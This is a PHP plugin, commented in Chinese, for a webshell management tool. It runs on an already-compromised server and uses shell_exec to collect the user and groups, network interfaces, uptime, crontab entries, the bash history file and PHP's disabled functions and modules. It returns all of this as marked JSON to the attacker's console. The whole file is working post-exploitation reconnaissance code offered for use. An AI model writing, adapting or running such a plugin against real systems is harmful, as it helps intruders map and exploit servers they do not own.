<?php
// 目标侧系统信息收集（webshell 管理示例插件）
$u = function_exists('shell_exec') ? @shell_exec('id -un 2>/dev/null || whoami') : get_current_user();
$g = function_exists('shell_exec') ? trim((string)@shell_exec('id -Gn 2>/dev/null')) : '';
$if = function_exists('shell_exec') ? (string)@shell_exec('ip -o addr 2>/dev/null || ifconfig -a 2>/dev/null') : '';
$rt = function_exists('shell_exec') ? trim((string)@shell_exec('cat /proc/uptime 2>/dev/null')) : '';
$cron = function_exists('shell_exec') ? (string)@shell_exec('crontab -l 2>/dev/null') : '';
$hist = function_exists('shell_exec') ? trim((string)@shell_exec('ls -la ~/.bash_history 2>/dev/null')) : '';
echo 'WSMJSON' . json_encode(array(
    'user' => trim((string)$u),
    'groups' => $g,
    'os' => PHP_OS,
    'uname' => php_uname(),
    'cwd' => getcwd(),
    'php' => PHP_VERSION,
    'interfaces' => $if,
    'uptime' => $rt,
    'crontab' => $cron,
    'history_file' => $hist,
    'disabled' => (string)ini_get('disable_functions'),
    'modules' => implode(',', get_loaded_extensions())
));
